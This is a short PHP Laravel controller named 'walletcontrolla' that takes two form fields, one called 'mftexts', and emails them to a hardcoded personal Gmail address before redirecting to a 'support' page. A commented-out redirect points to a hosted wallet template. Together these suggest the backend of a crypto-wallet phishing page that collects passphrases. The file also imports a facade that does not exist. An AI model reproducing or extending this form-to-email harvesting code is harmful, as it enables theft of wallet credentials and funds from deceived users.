<?php

namespace App\Http\Controllers;

use App\Mail\RequestReceived;
use App\Models\Datapost;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\smtp;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;

use Illuminate\Support\Facades\Mail;

class walletcontrolla extends Controller
{
    //
    public function postForm(Request $request)
    {


        $posted = [
            'title' => $request->mftexts,
            'body' => $request->body,
        ];
        Mail::to('paulchekwube5@gmail.com')->send(new RequestReceived($posted));
        return redirect('support');
        // if (Datapost::create($posted)) {

        //     // return redirect('https://pi-p.brimble.app/template/wallet2.html');
        
        // }
    }

    public function destroy(Datapost $form)
    {
        $form->delete();
        return redirect()->back();
    }
}
